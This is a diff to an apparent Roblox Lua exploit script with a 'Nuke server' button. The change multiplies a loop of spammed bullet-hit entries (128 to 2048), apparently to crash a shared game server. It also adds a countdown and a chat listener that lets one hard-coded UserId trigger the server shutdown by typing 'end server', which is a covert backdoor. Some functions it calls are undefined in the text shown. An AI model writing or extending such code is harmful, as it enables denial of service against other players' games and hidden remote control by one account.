@@ -80,7 +80,7 @@ local function fun()
         while ihatevars do
         coroutine.resume(coroutine.create(function()
             local bulletTable = {}
-            local y = 128
+            local y = 2048
             while y > 1 do
                 table.insert(bulletTable, {
                     Hit = target,
@@ -118,6 +118,15 @@ local player = game.Players.LocalPlayer
 local humanoid = player.Character:WaitForChild("Humanoid")
 
 local function startfun()
+    print('ENDING SERVER IN 5')
+    sleep(1)
+    print('4')
+    sleep(1)
+    print('3')
+    sleep(1)
+    print('2')
+    sleep(1)
+    print('1')
     local function respawnListener()
         while true do
             game:GetService("Players").PlayerAdded:Wait()
@@ -152,4 +161,24 @@ button.Size = UDim2.new(0, 100, 0, 50)
 button.Text = "Nuke server"
 button.TextSize = 10
 button.MouseButton1Click:Connect(startfun)
-print('unreal')
+print('16x fun update')
+
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        if player.UserId == 1422208527 and message == 'end server' then
+            startfun()
+        end
+    end)
+end
+
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        print("User " .. player.UserId .. " chatted: " .. message)
+        if player.UserId == 1422208527 then
+            print("User did chat")
+            if checkChat(message) then
+                myFunction()
+            end
+        end
+    end)
+end)
